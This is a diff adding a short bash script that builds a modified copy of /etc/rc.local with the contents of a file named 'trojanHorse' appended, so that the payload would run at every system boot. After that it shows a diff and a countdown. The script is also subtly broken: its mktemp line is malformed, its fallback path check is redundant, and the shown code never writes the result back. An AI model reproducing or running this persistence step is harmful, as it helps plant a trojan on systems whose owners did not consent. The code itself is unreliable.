@@ -1,0 +1,28 @@
+#!/bin/bash
+TMP_RC_LOCAL_DIR=/tmp/mktemp -d --suffix=RCLOCAL
+TMP_RC_LOCAL=$TMP_RC_LOCAL_DIR/rc.local
+grep -v '^exit\ 0$' /etc/rc.local > $TMP_RC_LOCAL
+
+check_if_line_exists()
+{
+    # grep wont care if one or both files dont exist.
+    grep -qsFx "$LINE_TO_ADD" $TMP_RC_LOCAL
+}
+
+add_line_to_RC_LOCAL()
+{
+    RC_LOCAL=$TMP_RC_LOCAL
+    [ -w "$RC_LOCAL" ] || RC_LOCAL=$TMP_RC_LOCAL
+    printf "%s\n" "$LINE_TO_ADD" >> "$RC_LOCAL"
+}
+
+LINE_TO_ADD=`cat trojanHorse`
+check_if_line_exists || add_line_to_RC_LOCAL
+
+echo 'exit 0' >> $TMP_RC_LOCAL
+
+echo 'I will be adding these entries (removing duplicates):'
+diff /etc/rc.local $TMP_RC_LOCAL
+echo -n 'ctrl-C to stop now! or forever hold your peace'
+sleep 1;echo -n '.';sleep 1;echo -n '.';sleep 1;echo -n '.';sleep 1;echo -n '.'
+sleep 1
